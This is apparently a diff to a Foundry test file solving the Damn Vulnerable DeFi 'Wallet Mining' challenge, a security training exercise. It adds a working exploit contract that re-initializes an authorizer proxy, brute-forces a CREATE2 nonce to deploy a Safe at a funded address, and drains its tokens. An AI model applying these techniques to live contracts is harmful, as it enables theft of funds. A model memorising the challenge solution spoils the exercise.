@@ -4,6 +4,7 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {Create2} from "@openzeppelin/contracts/utils/Create2.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
@@ -11,6 +12,37 @@ import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
 import {
     AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
 } from "../../src/wallet-mining/AuthorizerFactory.sol";
+
+contract Attack {
+    function attack(
+        AuthorizerUpgradeable authorizer,
+        WalletDeployer deployer,
+        address token,
+        address safe,
+        address ward,
+        bytes memory initializer,
+        uint256 nonce,
+        bytes memory data
+    ) external {
+        // initialize the reliance of the guard
+        address[] memory wards = new address[](1);
+        address[] memory aims = new address[](1);
+
+        wards[0] = address(this);
+        aims[0] = safe;
+
+        authorizer.init(wards, aims);
+
+        // drop the wallet from the wallet deployer
+        bool success = deployer.drop(safe, initializer, nonce);
+        require(success, "drop failed");
+
+        DamnValuableToken(token).transfer(ward, DamnValuableToken(token).balanceOf(address(this)));
+
+        (success,) = safe.call(data);
+        require(success, "tx failed");
+    }
+}
 
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -61,6 +93,8 @@ contract WalletMiningChallenge is Test {
         aims[0] = USER_DEPOSIT_ADDRESS;
         AuthorizerFactory authorizerFactory = new AuthorizerFactory();
         authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));
+
+        console.log("authorizer needs INit value is : ", authorizer.needsInit());
 
         // Send big bag full of DVT tokens to the deposit address
         token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);
@@ -123,7 +157,125 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        // get the nonce first of all
+
+        bool found = false;
+        uint256 nonce = 0;
+
+        address[] memory _owners = new address[](1);
+        _owners[0] = user;
+
+        // delegate call
+        bytes memory initializer =
+            abi.encodeCall(Safe.setup, (_owners, 1, address(0), "", address(0), address(0), 0, payable(0)));
+
+        console.log("proxy code is : ");
+        console.logBytes32(keccak256(abi.encodePacked(type(SafeProxy).creationCode, singletonCopy)));
+        console.log("adres of proxy factyory", address(proxyFactory));
+        bytes32 creationCodeHash =
+            keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy)))));
+        console.logBytes32(creationCodeHash);
+
+        while (!found) {
+            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
+
+            address target = address(
+                uint160(
+                    uint256(
+                        keccak256(
+                            abi.encodePacked(
+                                hex"ff",
+                                address(proxyFactory),
+                                salt,
+                                keccak256(
+                                    abi.encodePacked(
+                                        type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy)))
+                                    )
+                                )
+                            )
+                        )
+                    )
+                )
+            );
+            if (target == USER_DEPOSIT_ADDRESS) {
+                found = true;
+                break;
+            }
+            ++nonce;
+        }
+
+        console.log("found nonce", nonce);
+
+        // let's execute teh transaction
+
+        // 1st step is to get the transaction hash and then sign the transaction hash
+
+        bytes memory dataForExecution;
+
+        {
+            address to = address(token);
+            uint256 value = 0;
+            bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", user, DEPOSIT_TOKEN_AMOUNT);
+            Enum.Operation operation = Enum.Operation.Call; // either call or delegate call
+            uint256 safeTxGas = 100000;
+            uint256 baseGas = 100000;
+            uint256 gasPrice = 0;
+            address gasToken = address(0);
+            address refundReceiver = address(0);
+            uint256 _nonce = 0;
+            bytes memory signatures;
+
+            bytes32 SAFE_TX_TYPEHASH = 0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8;
+            bytes32 DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;
+
+            {
+                // get the transaction type hash and sign the trasnaciotn
+                bytes32 safeHash = keccak256(
+                    abi.encode(
+                        SAFE_TX_TYPEHASH,
+                        to,
+                        value,
+                        keccak256(data),
+                        operation,
+                        safeTxGas,
+                        baseGas,
+                        gasPrice,
+                        gasToken,
+                        refundReceiver,
+                        _nonce
+                    )
+                );
+
+                bytes32 domainSeparator =
+                    keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, singletonCopy.getChainId(), USER_DEPOSIT_ADDRESS));
+
+                bytes32 typehash = keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeHash));
+
+                (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, typehash);
+                signatures = abi.encodePacked(r, s, v);
+            }
+
+            dataForExecution = abi.encodeWithSelector(
+                singletonCopy.execTransaction.selector,
+                to,
+                value,
+                data,
+                operation,
+                safeTxGas,
+                baseGas,
+                gasPrice,
+                gasToken,
+                refundReceiver,
+                signatures
+            );
+        }
+
+        Attack att = new Attack();
+        att.attack(
+            authorizer, walletDeployer, address(token), USER_DEPOSIT_ADDRESS, ward, initializer, nonce, dataForExecution
+        );
+
+        // singletonCopy.getTransactionHash()
     }
 
     /**
